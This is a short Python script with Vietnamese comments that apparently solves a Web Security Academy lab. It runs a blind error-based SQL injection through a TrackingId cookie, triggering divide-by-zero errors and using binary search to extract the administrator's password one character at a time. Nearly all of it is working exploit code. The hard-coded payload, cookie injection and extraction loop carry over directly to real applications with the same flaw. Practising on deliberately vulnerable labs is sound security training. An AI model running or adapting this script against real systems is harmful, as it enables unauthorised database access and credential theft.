import requests
from termcolor import colored

alphanumeric = '0123456789abcdefghijklmnopqrstuvwxyz'
#target tự điền
target = "https://0a7c0012034c199f80c6083d000800f0.web-security-academy.net/"
success_indicator = "Welcome back"
password = ""
password_length = 20 #password length cũng tự điền

#payload : "'||(SELECT CASE WHEN SUBSTR(password,{position},1)='{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
print(colored("[i] Trích xuất mật khẩu (Binary Search):", "blue"))


def is_greater_than(position, char):
    payload = f"'||(SELECT CASE WHEN SUBSTR(password,{position},1)>'{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
    headers = { 
        "Cookie": f"TrackingId=RzHLK4UdejBOBAv4{payload}; session=oTlUogfkNbLYZ2aLbGo12EKAE7TYMZg3"
    }

    response = requests.get(target, headers=headers)
    # Nếu Web lỗi 500 (Tức là điều kiện '>' đúng, dẫn đến chia cho 0) -> trả về True
    return not (response.status_code == 200)


def find_char_at_position(position):
    low = 0
    high = len(alphanumeric) - 1

    while low < high:
        mid = (low + high) // 2
        mid_char = alphanumeric[mid]

        print(f"[*] Pos {position}: thử > '{mid_char}'")

        if is_greater_than(position, mid_char):
            low = mid + 1
        else:
            high = mid

    return alphanumeric[low]


for position in range(1, password_length + 1):
    char = find_char_at_position(position)
    password += char

    print(colored(f"[+] Vị trí {position}: {char} -> {password}", "green"))

print(colored(f"\n[!] Mật khẩu là: {password}", "yellow"))